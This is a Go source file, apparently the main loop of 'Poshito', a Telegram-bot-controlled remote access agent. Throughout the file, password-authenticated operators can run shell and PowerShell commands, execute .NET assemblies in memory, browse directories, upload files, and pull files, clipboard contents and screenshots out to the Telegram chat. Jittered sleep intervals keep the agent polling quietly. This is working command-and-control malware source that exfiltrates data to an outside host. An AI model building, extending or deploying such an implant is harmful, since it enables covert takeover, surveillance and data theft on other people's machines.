package main

import (
	_ "embed"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var (
	//go:embed Config/sleep_time
	sleep_time string
	//go:embed Config/sleep_time_jitter
	sleep_time_jitter string
)

func wrapSendFile(chatID int64, fullpath string) {
	data, err := os.ReadFile(fullpath)
	if err != nil {
		SendMessage(chatID, err.Error())
		return
	}
	sendFile(chatID, filepath.Base(fullpath), data)
}

func parseCommand(chatID int64, text string) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/info":
		getInfo(chatID)
	case "/cmd":
		if len(commandParts) == 1 {
			SendMessage(chatID, "No command supplied. \nUsage: /cmd <shell-command>")
			return
		}
		executeCommand(chatID, commandParts[1:])
	case "/dir":
		if len(commandParts) == 1 {
			SendMessage(chatID, "No directory supplied. \nUsage: /dir <dir-path>")
			return
		}
		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/down":
		if len(commandParts) == 1 {
			SendMessage(chatID, "No file path supplied. \nUsage: /down <file-path>")
			return
		}
		wrapSendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/clip":
		getClipboard(chatID)
	case "/screen":
		takeScreenshots(chatID)
	case "/asm":
		if len(commandParts) < 2 {
			SendMessage(chatID, "Wrong usage. Usage: /asm <assembly-file|assembly-hash> <assembly-params>")
			return
		}
		assemblyHash := commandParts[1]
		assemblyArgs := commandParts[2:]
		executeAssemblyByHash(chatID, assemblyHash, assemblyArgs, "")
	case "/iex":
		if len(commandParts) == 1 {
			SendMessage(chatID, "No command supplied. \nUsage: /iex <powershell-command>")
			return
		}
		scriptBlock := []string{"return"}
		scriptBlockStr := strings.TrimSpace(strings.Join(commandParts[1:], " "))
		if scriptBlockStr != "" {
			scriptBlock = strings.Split(scriptBlockStr, " ")
		}
		executePowershell(chatID, scriptBlock, "")
	case "/die":
		SendMessage(chatID, "Poshito exits.")
		// We do that to avoid getting the die command again when we're back alive
		GetUpdates(offset)
		os.Exit(0)
	case "/sleep":
		if len(commandParts) != 3 {
			SendMessage(chatID, "Wrong usage. \nUsage: /sleep <seconds-to-sleep> <sleep-jitter-%>")
			return
		}
		// Here we convert only to validate the arguments, it's converted while sleeping again
		_, err_st := strconv.Atoi(commandParts[1])
		_, err_sj := strconv.Atoi(commandParts[2])
		if (err_st != nil) || (err_sj != nil) {
			SendMessage(chatID, "Wrong usage. /sleep <seconds-to-sleep> <sleep-jitter-%>")
			return
		}
		sleep_time = commandParts[1]
		sleep_time_jitter = commandParts[2]
		SendMessage(chatID, "Sleep changed")

	default:
		SendMessage(chatID, "No such command 🥴")
	}
}

func parseFileCommand(chatID int64, file *Document, caption string) {
	if strings.HasPrefix(caption, "/asm") {
		// Gonna execute assembly
		assemblyBytes, err := downloadFileBytes(file)
		if err == nil {
			assemblyArgs := strings.Split(strings.TrimSpace(caption[4:]), " ")
			executeAssembly(chatID, assemblyBytes, assemblyArgs, "")
		}
	} else if strings.HasPrefix(caption, "/up") {
		var responseText string
		// Gonna download a file from the bot
		filePath := strings.TrimSpace(caption[3:])
		err := downloadFile(file, filePath)
		if err != nil {
			// Caption is bad file path, let's try original file name to current folder
			fileName := file.FileName
			err = downloadFile(file, fileName)
			if err != nil {
				responseText = "Could not save file"
			} else {
				responseText = "Saved: " + fileName
			}
		} else {
			responseText = "Saved: " + filePath
		}
		SendMessage(chatID, responseText)
	} else {
		SendMessage(chatID, "No such command 🥴")
	}
}

func onStart() {
	drm()
}

func main() {

	onStart()

	for {
		updates, _ := GetUpdates(offset)
		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			file := update.Message.Document
			caption := update.Message.Caption
			if contains(chatIDs, chatID) {
				if file != nil {
					parseFileCommand(chatID, file, caption)
				} else {
					parseCommand(chatID, text)
				}
			} else if md5Hash(text) == passMd5 {
				chatIDs = append(chatIDs, chatID)
				responseText := "Password confirmed. \nPoshito is welcoming you 🤖"
				SendMessage(chatID, responseText)
			} else {
				responseText := "Wrong password."
				SendMessage(chatID, responseText)
			}
		}
		if len(updates.Result) == 0 {
			sleep_time, _ := strconv.Atoi(sleep_time)
			sleep_time_jitter, _ := strconv.Atoi(sleep_time_jitter)
			time_to_sleep := calcSleepTime(sleep_time, sleep_time_jitter)
			time.Sleep(time.Duration(time_to_sleep) * time.Second)
		}

	}
}
